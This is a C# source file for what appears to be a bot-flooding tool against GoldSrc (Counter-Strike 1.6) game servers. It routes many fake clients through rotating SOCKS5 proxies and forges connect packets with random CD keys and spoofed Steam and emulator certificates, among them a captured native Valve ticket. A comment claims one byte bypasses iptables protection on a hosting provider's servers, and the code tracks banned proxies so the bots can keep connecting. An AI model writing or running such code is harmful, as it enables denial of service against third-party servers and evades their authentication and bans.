using SocklientDotNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace IICv2
{
    enum state 
    {
        Inicialized = 0,
        UDPAssociating,
        UDPAssociated,
        SendingRequestChallenge,
        SendedRequestChallenge,
        ResivingChallenge,
        ResivedChallenge,
        Connecting,
        Connected,
        ProxyFailed,
        Failed
    }
    class User
    {
        private static readonly List<string> modelsn = new List<string> { "arctic", "gign", "gsg9", "leet", "sas", "terror", "urban", "vip", "guerilla", };

        private Socklient socklientProxyClient;

        private List<byte> list = new List<byte>();

        private bool kill = false;
        private bool change = false;
        private byte proxyfailcount = 0;
        private byte norespondcount = 0;

        private Guid identity = System.Guid.NewGuid();
        private state status = state.Inicialized;
        private string statusInfo = "Inicialized";
        private static FormMain form = null;
        private string proxyaddress;
        private int proxyport;
        private string nick;
        private static string desAddress = null; //xxx.xxx.xxx.xxx
        private static int desPort = -1; //xxxxx
        private int interval;
        private int steamid;
        private int timeout;
        private byte[] buffer;
        private string challenge = string.Empty;
        public string StatusInfo { get => statusInfo; }
        public Guid Identity { get => identity; }
        public Socklient Proxy { get => socklientProxyClient; }
        internal state Status { get => status; }
        public string Proxyaddress { get => proxyaddress; }
        public int Proxyport { get => proxyport; }
        public string Nick { get => nick; }
        public int Interval { get => interval; }
        public int Timeout { get => timeout; }
        public bool Kill { get => kill; }
        public void Terminate() => kill = true;

        public static void NullAddress()
        {
            desAddress = null;
            desPort = -1;
        }
        public User(FormMain _form, string _nick, string _address, int _steamid, int _interval, string _proxy = null, int _proxyport = 0, int _timeout = 0)
        {
            this.proxyaddress = _proxy;
            this.proxyport = _proxyport;
            this.socklientProxyClient = new Socklient(IPAddress.Parse(_proxy), _proxyport);
            this.steamid = _steamid;
            this.nick = _nick;
            string[] split = _address.Split(new char[] { ':' });
            if (form == null)
                form = _form;
            if (desAddress == null)
                desAddress = split[0];
            if (desPort == -1)
                desPort = int.Parse(split[1]);

            this.interval = _interval;
            this.timeout = _timeout;
            _form.ConnectionsAddRow(identity.ToString(), this.nick, (_proxy + ":" + _proxyport.ToString()), this.statusInfo, 0, 0);
        }

        public bool Connect()
        {
            buffer = new byte[2048];
            try
            {
                socklientProxyClient.TCP.Client.ReceiveTimeout = timeout;
                socklientProxyClient.TCP.Client.SendTimeout = timeout;
                status = state.UDPAssociating;

                socklientProxyClient.UdpAssociate(IPAddress.Any, 0);
                status = state.UDPAssociated;

                socklientProxyClient.UDP.Client.ReceiveTimeout = timeout;
                socklientProxyClient.UDP.Client.SendTimeout = timeout;

                status = state.SendingRequestChallenge;

                socklientProxyClient.Send(new byte[] {
                    0xff, 0xff, 0xff, 0xff, 0x67,
                    0x65, 0x74, 0x63, 0x68, 0x61,
                    0x6c, 0x6c, 0x65, 0x6e, 0x67,
                    0x65, 0x20, 0x73,0x74, 0x65, 0x61, 0x6d,
                    0x0A }, desAddress, desPort); // 0x0A bypass iptables protection Voxility servers
                                                  // SV_GetChallenge
                status = state.SendedRequestChallenge;

                status = state.ResivingChallenge;
                buffer = socklientProxyClient.Receive(); // the buffer contains the received data from remote
                status = state.ResivedChallenge;

                string challenge = Encoding.Default.GetString(buffer).Split(new char[] { ' ' })[1];
                PostProcess(buffer);
                if (proxyfailcount > 0)
                {
                    proxyfailcount--;
                    change = true;
                }
                    
            }
            catch (Exception)
            {
                statusInfo = "ProxyCommonFail";
                status = state.ProxyFailed;
                proxyfailcount++;
                change = true;
                if (proxyfailcount > 5)
                {
                    form.RowChangeColor(identity, Color.Red);
                    form.PrintC($"[{identity}] | TERMINATED | REASON: Too many ProxyCommonFail", Color.Red);
                    Terminate();
                }
                return false;
            }
            return true;
        }

        private void PostProcess(byte[] buffer)
        {
            //Protinfo packet
            string userkey = "\"\\prot\\3\\unique\\-1\\raw\\steam\\cdkey\\" + RNDGEN.CDKeyGenerator(32) + "\" \"";

            if (form.tb_password.Text != "")
                userkey += "\\password\\" + form.tb_password.Text;

            // Setinfo packet
            string userinfo = generateSetinfo(form.tb_setinfo.Text);

            string fullstring2 = userkey + userinfo;
            challenge = Encoding.Default.GetString(buffer).Split(new char[] { ' ' })[1];
            form.RowChangeColor(identity, Color.Lime);
            form.PrintC($"[{identity}] | CONNECTED  | CHALLENGE: {challenge}", Color.Lime);
            statusInfo = "Challenge: " + challenge;
            List<byte> list = new List<byte>();
            list.AddRange(new byte[] { 0xff, 0xff, 0xff, 0xff }); // yyyy(utf8) for make connection
            list.AddRange(Encoding.Default.GetBytes("connect")); // SV_ConnectClient
            list.AddRange(new byte[] { 0x20 });
            list.AddRange(Encoding.Default.GetBytes("48")); // SV_CheckProtocol
            list.AddRange(new byte[] { 0x20 });
            list.AddRange(Encoding.Default.GetBytes(challenge));
            list.AddRange(new byte[] { 0x20 });

            list.AddRange(Encoding.Default.GetBytes(fullstring2));

            //Start steamid certificated
            list.AddRange(new byte[] { 0xff, 0x42, 0x30, 0x54, 0xff, 0x0A }); // validation SV_GetIDString
            switch (steamid)
            {
                case 0:
                    {
                        // Generate RevEmu certificate 
                        list.AddRange(new byte[] {
                            0x4A, 0x00, 0x00, 0x00, 0x39, 0x05, 0x00, 0x00, 0x76, 0x65, 0x72, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x72, 0x0A, 0x00, 0x00, 0x01, 0x00, 0x10, 0x01, 0x4A, 0x38, 0x32, 0x5A, 0x57, 0x51, 
                            0x41, 0x42, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                        });

                        break;
                    }
                case 1:
                    {
                        // Generate oldRevEmu certificate
                        list.AddRange(new byte[] { 0xFF, 0xFF });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(8)));

                        break;
                    }
                case 2:
                    {
                        //Generate SteamEmu certificate
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(80)));
                        list.AddRange(new byte[] { 0xff, 0xff, 0xff, 0xff });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(684)));

                        break;
                    }
                case 3:
                    {
                        // Generate AVSMP 1 certificate
                        list.AddRange(new byte[] { 0x14, 0x00, 0x00, 0x00 });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(8)));
                        list.AddRange(new byte[] { 0xFF });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(3)));
                        list.AddRange(new byte[] { 0x01, 0x00, 0x10, 0x01 });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(4)));
                        list.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00 });

                        break;
                    }
                case 4:
                    {
                        // Generate AVSMP 0 certificate
                        list.AddRange(new byte[] { 0x14, 0x00, 0x00, 0x00 });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(12)));
                        list.AddRange(new byte[] { 0x01, 0x00, 0x10, 0x01 });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(4)));
                        list.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00 });

                        break;
                    }
                case 5:
                    {
                        // Generate SteamEmu certificate
                        list.AddRange(new byte[] { 
                            0x7B, 0x7F, 0xCA, 0xD4, 0x23, 0x60, 0xDB, 0xC7, 0x1F, 0x2E, 0x6A, 0x6D, 0x96, 0x2A, 0x1A,
                            0x21, 0x44, 0x31, 0xC8, 0x3A, 0x05, 0x31, 0xC4, 0xB4 
                        });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.RandomString(744)));

                        break;
                    }
                case 6:
                    {
                        // Generate NativeSteam by Valve certificate
                        // This packet is sended by native of Valve (original SteamID)
                        // Note : it should be changed automatically to 14 days as it expires
                        list.AddRange(new byte[] {
                            0x14,0x00,0x00,0x00,0x33,0xF3,0x93,0x6F,0x25,0x9F,0x5D,0x73,0xFE,0x37,0x69,0x17,0x01,0x00,
                            0x10,0x01,0xF7,0xC9,0xD7,0x5D,0xB2,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x04,0x00,0x00,0x00,
                            0xFE,0x37,0x69,0x17,0x01,0x00,0x10,0x01,0x0A,0x00,0x00,0x00,0x7A,0x74,0x79,0x3E,0x67,0x00,
                            0xA8,0xC0,0x00,0x00,0x00,0x00,0x71,0x56,0xD5,0x5D,0xF1,0x05,0xF1,0x5D,0x01,0x00,0x07,0x00,
                            0x00,0x00,0x00,0x00,0x01,0x00,0xD0,0xCB,0xCD,0x16,0xBD,0xB9,0xBE,0x28,0x34,0x22,0x77,0x69,
                            0xBC,0x51,0x59,0xA4,0xE9,0x56,0x17,0xD0,0x2B,0xD2,0xCE,0x35,0x5E,0xB1,0x57,0x87,0x66,0x9A,
                            0x8D,0x37,0xC8,0xC2,0xFF,0xC6,0x8B,0xBD,0x50,0x7C,0x5C,0x6E,0xCC,0x8D,0xEE,0x31,0xB1,0x9D,
                            0xD1,0x63,0x87,0x35,0x81,0x62,0x36,0x76,0x49,0xB9,0x87,0x2A,0x65,0xDF,0x43,0xAA,0xCD,0x87,
                            0x81,0xA3,0x8A,0xED,0xA1,0xAF,0x57,0x87,0xAC,0x85,0xBA,0x0F,0xC1,0x4D,0x20,0xBA,0x7E,0xA3,
                            0x5B,0x3E,0xB4,0x98,0xC4,0x9F,0xE4,0x2F,0xCB,0xD7,0xA6,0x04,0x6C,0xE2,0x2E,0x67,0xF5,0x23,
                            0xC4,0xF5,0x38,0x55,0x24,0x0C,0x91,0x40,0xCA,0x07,0x86,0x6C,0xF6,0x45,0x43,0x84,0x45,0x02,
                            0x91,0xCD,0x91,0xA4,0xFC,0x85,0x62,0xC9
                            });
                        break;
                    }
                case 7:
                    {
                        // MF
                        list.AddRange(new byte[] {
                            0x4a,0x00,0x00,0x00,0x4a,0xfc,0xa4,0xf7,0x76,0x65,0x72,0x00,0x00,0x00,0x00,0x00,0x94,0xf8,
                            0x49,0xef,0x01,0x00,0x10,0x01
                            });
                        list.AddRange(Encoding.Default.GetBytes(RNDGEN.rnd.Next(10000, 99999).ToString() + RNDGEN.rnd.Next(10000, 99999).ToString()));
                        list.AddRange(new byte[] {
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00,
                            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                        });
                        break;
                    }
                default:
                    break;
            }
            this.list = list;
            status = state.Connecting;
        }

        private string generateSetinfo(string text)
        {
            text = text.Replace("\n", "").Replace("\r", "");
            var split = text.Split('<');
            text = "";
            for (int i = 0; i < split.Length; i++)
            {
                if (split[i].Contains(">"))
                {
                    var lsplit = split[i].Split('>');
                    if (lsplit[0].ToLower() == "name")
                    {
                        text += nick;
                        text += lsplit[1];
                    }
                    else if (lsplit[0].ToLower() == "model")
                    {
                        text += modelsn[RNDGEN.rnd.Next(modelsn.Count)];
                        text += lsplit[1];
                    }
                    else if (lsplit[0].Contains('-'))
                    {
                        var rslpit = lsplit[0].Split('-');
                        text += RNDGEN.rnd.Next(int.Parse(rslpit[0]), int.Parse(rslpit[1]));
                        text += lsplit[1];
                    }
                    else
                        text += split[i];
                }
                else
                    text += split[i];
            }
            return text+"\"";
        }

        public bool UpdateInfo()
        {
            string s = this.statusInfo.Replace("˙˙˙˙", "");

            form.ConnectionsEditRow(this.identity, 3, status.ToString() + " " + s);
            if (change)
            {
                form.ConnectionsEditRow(this.identity, 4, proxyfailcount.ToString());
                form.ConnectionsEditRow(this.identity, 5, norespondcount.ToString());
                form.RowChangeColor(identity, Color.Yellow);
                change = false;
            }

            if (s.Contains("challenge"))
                Connect();

            if (s.Contains("Invalid userinfo"))
                Rename(form.GetRandomName());

            if ((s.ToLower().Contains("banned") || s.ToLower().Contains("proxy") ) && !kill)
            {
                form.RowChangeColor(identity, Color.Magenta);
                form.PrintC($"[{identity}] | BANNED     | IP:{proxyaddress}", Color.Purple);
                FormMain.Banned.Add(proxyaddress);
                Terminate();
            }

            if (s.Contains("Connect failed somewhere...") || s.Contains("UserID: 0") || s.Contains("Not Responding"))
                return false;
            form.RowChangeColor(identity, Color.White);

            return true;
        }

        public bool timer_Tick()
        {
            try
            {
                byte[] buffer = new byte[2048];
                socklientProxyClient.Send(this.list.ToArray(), desAddress, desPort);
                buffer = socklientProxyClient.Receive();
                UpdatePostProcess(buffer);

                if (norespondcount > 0)
                {
                    norespondcount--;
                    change = true;
                }

                if (statusInfo.Contains("STEAM validation rejected"))
                {
                    form.PrintC($"[{identity}] | FAILING    | Type: STEAM validation rejected", Color.Yellow);
                    FormMain.SteamReject++;
                }
                else if (statusInfo.Contains("No password"))
                {
                    form.PrintC($"[{identity}] | FAILING    | Type: No password set", Color.Yellow);
                    FormMain.InvalidPass++;
                }
                else if (statusInfo.Contains("BADPASS"))
                {
                    form.PrintC($"[{identity}] | FAILING    | Type: Wrong password set", Color.Yellow);
                    FormMain.InvalidPass++;
                }
                return true;
            }
            catch (Exception)
            {
                statusInfo = "SR: Not Responding";
                status = state.Failed;
                norespondcount++;
                change = true;
                if (norespondcount > 10)
                {
                    form.RowChangeColor(identity, Color.Red);
                    form.PrintC($"[{identity}] | TERMINATED | REASON: Too many try without respond", Color.Red);
                    Terminate();
                }
            }

            return false;
        }
        
        private void UpdatePostProcess(byte[] buffer)
        {
            status = state.Connected;
            string correctinfo = Encoding.Default.GetString(buffer).Replace("ÿ", null).Replace("9", null).Replace("8", null);
            if (correctinfo.Contains("B "))
            {
                string useridplayer = Encoding.Default.GetString(buffer).Split(new char[] { ' ' })[1];
                statusInfo = "SR: SC | UID: " + useridplayer;
                FormMain.SteamReject = 0;
                FormMain.InvalidPass = 0;
            }
            else
                statusInfo = "SR: " + correctinfo;
        }

        public bool Rename(string name)
        {
            if (buffer == null || status == state.ProxyFailed)
                return false;
            form.PrintC($"[{identity}] | RENAMED    | \"{nick}\" renamed as \"{name}\"", Color.Gold);
            nick = name;
            PostProcess(buffer);

            return true;
        }
    }
    public static class RNDGEN
    {
        public static Random rnd = new Random();
        public static string RandomString(int length)
        {
            const string chars = "qwertyuiopasdfghjklzxcvbnmABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rnd.Next(s.Length)]).ToArray());
        }
        public static string CDKeyGenerator(int length)
        {
            const string CDKeyGenerator = "abc0123456789";
            return new string(Enumerable.Repeat(CDKeyGenerator, length).Select(s => s[rnd.Next(s.Length)]).ToArray());
        }
    }
}
